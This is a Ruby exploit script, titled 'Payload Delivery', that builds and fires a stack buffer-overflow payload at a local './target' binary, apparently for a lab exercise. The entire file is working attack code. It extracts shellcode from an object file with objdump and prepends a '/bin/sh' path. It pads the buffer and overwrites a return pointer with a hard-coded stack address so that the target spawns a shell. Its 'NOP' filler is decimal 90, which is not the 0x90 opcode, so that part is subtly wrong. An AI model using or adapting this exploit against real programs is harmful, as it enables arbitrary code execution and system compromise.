#!/usr/bin/env ruby
# Payload Delivery

if ENV['PS1'] != "$ "
    puts "Error: PS1 environment variable must be equal to '$ '."
    exit 66
end

shell_path = "/bin/sh xxxxxxxxxxxxxxxx" # Space to be replaced with NULL, 16 'x's representing 2 pointers
array_in_memory =  0x7ffeefbff260 # You need to get it somehow... Maybe compile target.c with a printf temporarily. Or go the lldb route. Suit yourself.
target = './target'

if !File.exists?(target)
    puts "Error: Target application #{target} does not exist."
    exit 66
end

`make attack` # Shell invocation

# Makeshift objcopy, Xcode installations do not have GNU objcopy by default
shell_code = `objdump -disassemble -x86-asm-syntax=intel attack.o`.
split("\n"). # Split by line
map { |instruction| /[0-9a-f]+:\s*((?:[0-9a-f][0-9a-f]\s)+)/.match(instruction) }. # Use regular expression to match instructions
select { |match| match != nil }. # Filter out non-instruction lines
map { |instruction| instruction[1].split(" ") }. # Split machine code
flatten. # Flatten 2D array into 1D array
map { |byte| byte.to_i(16) } # Turn into integers

`rm attack.o`

# Begin constructing payload
attack = shell_path.unpack('c*') # Path to sh
shell_code.map { |byte| attack << byte } # Machine code to execute attach
puts "Payload size is #{attack.count} bytes.\n"
(1000 - shell_path.length - shell_code.length).times { attack << 90 } # NOP fill the rest of the array
(32).times { attack << 90 } # NOP fill ABI artefacts on the stack

# Replacing payload pointer
(array_in_memory + shell_path.length).
to_s(16). # Turn to hexadecimal string
chars. # Turn to characters
each_slice(2). # Slice into pairs of digits
map(&:join). # Join the pairs of digits
map { |byte| byte.to_i(16) }. # Parse pairs of twos as bytes
reverse. # Reverse for endianity
map { |byte| attack << byte } # Add to attack vector

puts "Attack!\n\n"
exec target, attack.pack('c*') # Attack!

#exec 'lldb', './target', '--', attack.pack('c*')